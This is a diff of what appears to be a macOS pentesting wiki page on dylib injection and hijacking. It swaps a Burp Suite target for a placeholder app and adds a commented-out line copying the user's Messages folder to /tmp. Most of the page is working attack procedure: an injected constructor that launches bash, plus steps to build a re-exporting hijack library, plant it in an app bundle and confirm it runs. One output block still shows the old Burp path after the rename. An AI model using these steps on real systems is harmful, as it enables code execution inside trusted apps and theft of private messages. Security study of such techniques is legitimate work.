@@ -22,6 +22,7 @@
 #include <syslog.h>
 #include <stdio.h>
 #include <unistd.h>
+#include <stdlib.h>
 __attribute__((constructor))
 
 void myconstructor(int argc, const char **argv)
@@ -29,6 +30,7 @@ void myconstructor(int argc, const char **argv)
     syslog(LOG_ERR, "[+] dylib injected in %s\n", argv[0]);
     printf("[+] dylib injected in %s\n", argv[0]);
     execv("/bin/bash", 0);
+    //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
 
@@ -53,21 +55,27 @@ DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 
 ## Dyld Hijacking Example
 
-The targeted vulenrable binary is `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java`.
+The targeted vulnerable binary is `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.
 
 {% tabs %}
+{% tab title="entitlements" %}
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"
+<strong>[...]com.apple.security.cs.disable-library-validation[...]
+</strong></code></pre>
+{% endtab %}
+
 {% tab title="LC_RPATH" %}
 {% code overflow="wrap" %}
 ```bash
 # Check where are the @rpath locations
-otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep LC_RPATH -A 2
+otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
           cmd LC_RPATH
       cmdsize 32
          path @loader_path/. (offset 12)
 --
           cmd LC_RPATH
       cmdsize 32
-         path @loader_path/../lib (offset 12)
+         path @loader_path/../lib2 (offset 12)
 ```
 {% endcode %}
 {% endtab %}
@@ -76,47 +84,41 @@ otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundl
 {% code overflow="wrap" %}
 ```bash
 # Check librareis loaded using @rapth and the used versions
-otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java" | grep "@rpath" -A 3
-         name @rpath/libjli.dylib (offset 24)
+otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep "@rpath" -A 3
+         name @rpath/lib.dylib (offset 24)
    time stamp 2 Thu Jan  1 01:00:02 1970
       current version 1.0.0
 compatibility version 1.0.0
+# Check the versions
 ```
 {% endcode %}
-{% endtab %}
-
-{% tab title="entitlements" %}
-<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">codesign -dv --entitlements :- "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java"
-<strong>[...]com.apple.security.cs.disable-library-validation[...]
-</strong></code></pre>
 {% endtab %}
 {% endtabs %}
 
 With the previous info we know that it's **not checking the signature of the loaded libraries** and it's **trying to load a library from**:
 
-* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
-* `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
+* `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
+* `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
 However, the first one doesn't exist:
 
 ```bash
 pwd
-/Applications/Burp Suite Professional.app
+/Applications/VulnDyld.app
 
-find ./ -name libjli.dylib
-./Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib
-./Contents/Resources/jre.bundle/Contents/MacOS/libjli.dylib
+find ./ -name lib.dylib
+./Contents/Resources/lib2/lib.dylib
 ```
 
 So, it's possible to hijack it! Create a library that **executes some arbitrary code and exports the same functionalities** as the legit library by reexporting it. And remember to compile it with the expected versions:
 
-{% code title="libjli.m" %}
+{% code title="lib.m" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 
 __attribute__((constructor))
 void custom(int argc, const char **argv) {
-    NSLog(@"[+] dylib hijacked in %s",argv[0]);
+    NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
 {% endcode %}
@@ -125,7 +127,7 @@ Compile it:
 
 {% code overflow="wrap" %}
 ```bash
-gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation libjli.m -Wl,-reexport_library,"/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" -o libjli.dylib
+gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
 {% endcode %}
@@ -135,16 +137,16 @@ The reexport path created in the library is relative to the loader, lets change 
 {% code overflow="wrap" %}
 ```bash
 #Check relative
-otool -l libjli.dylib| grep REEXPORT -A 2
+otool -l /tmp/lib.dylib| grep REEXPORT -A 2
          cmd LC_REEXPORT_DYLIB
          cmdsize 48
          name @rpath/libjli.dylib (offset 24)
 
-#Change to absolute to the location of the library
-install_name_tool -change @rpath/libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib" libjli.dylib
+#Change the location of the library absolute to absolute path
+install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib
 
 # Check again
-otool -l libjli.dylib| grep REEXPORT -A 2
+otool -l /tmp/lib.dylib| grep REEXPORT -A 2
           cmd LC_REEXPORT_DYLIB
       cmdsize 128
          name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
@@ -155,16 +157,15 @@ Finally just copy it to the **hijacked location**:
 
 {% code overflow="wrap" %}
 ```bash
-cp libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib"
+cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
 And **execute** the binary and check the **library was loaded**:
 
-<pre class="language-context"><code class="lang-context">./java
-<strong>2023-05-15 15:20:36.677 java[78809:21797902] [+] dylib hijacked in ./java
-</strong>Usage: java [options] &#x3C;mainclass> [args...]
-           (to execute a class)
+<pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
+</strong>Usage: [...]
 </code></pre>
 
 {% hint style="info" %}
@@ -178,66 +179,6 @@ If you are planing on trying to inject libraries in unexpected binaries you coul
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-
-## Check restrictions
-
-### SUID & SGID
-
-```bash
-# Make it owned by root and suid
-sudo chown root hello
-sudo chmod +s hello
-# Insert the library
-DYLD_INSERT_LIBRARIES=inject.dylib ./hello
-
-# Remove suid
-sudo chmod -s hello
-```
-
-### Section `__RESTRICT` with segment `__restrict`
-
-```bash
-gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restrict
-DYLD_INSERT_LIBRARIES=inject.dylib ./hello-restrict
-```
-
-### Hardened runtime
-
-Create a new certificate in the Keychain and use it to sign the binary:
-
-{% code overflow="wrap" %}
-```bash
-# Apply runtime proetction
-codesign -s <cert-name> --option=runtime ./hello
-DYLD_INSERT_LIBRARIES=inject.dylib ./hello #Library won't be injected
-
-# Apply library validation
-codesign -f -s <cert-name> --option=library ./hello
-DYLD_INSERT_LIBRARIES=inject.dylib ./hello-signed #Will throw an error because signature of binary and library aren't signed by same cert (signs must be from a valid Apple-signed developer certificate)
-
-# Sign it
-## If the signature is from an unverified developer the injection will still work
-## If it's from a verified developer, it won't
-codesign -f -s <cert-name> inject.dylib
-DYLD_INSERT_LIBRARIES=inject.dylib ./hello-signed
-
-# Apply CS_RESTRICT protection
-codesign -f -s <cert-name> --option=restrict hello-signed
-DYLD_INSERT_LIBRARIES=inject.dylib ./hello-signed # Won't work
-```
-{% endcode %}
-
-{% hint style="danger" %}
-Note that even if there are binaries signed with flags **`0x0(none)`**, they can get the **`CS_RESTRICT`** flag dynamically when executed and therefore this technique won't work in them.
-
-You can check if a proc has this flag with (get [**csops here**](https://github.com/axelexic/CSOps)):&#x20;
-
-```bash
-csops -status <pid>
-```
-
-and then check if the flag 0x800 is enabled.
-{% endhint %}
 
 <details>
 
